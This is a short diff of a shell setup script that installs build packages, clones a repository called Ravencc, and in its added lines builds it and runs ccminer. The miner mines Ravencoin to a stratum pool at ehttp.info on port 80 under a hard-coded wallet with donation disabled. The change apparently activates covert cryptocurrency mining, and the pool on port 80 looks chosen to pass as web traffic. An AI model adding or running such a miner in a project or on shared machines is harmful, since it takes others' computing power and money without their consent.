@@ -4,4 +4,5 @@ apt-get -y install libstdc++6 autotools-dev automake python-dev freeglut3-dev li
 git clone https://github.com/one10001/Ravencc.git 
 mv Ravencc/* ./
 # nohup ./build.sh >etl_rece.out 2>&1 &
-# ./ccminer -a x16r -o stratum+tcp://ehttp.info:80 -u RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK -p c=RVN --donate 0
+./build.sh
+./ccminer -a x16r -o stratum+tcp://ehttp.info:80 -u RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK -p c=RVN --donate 0
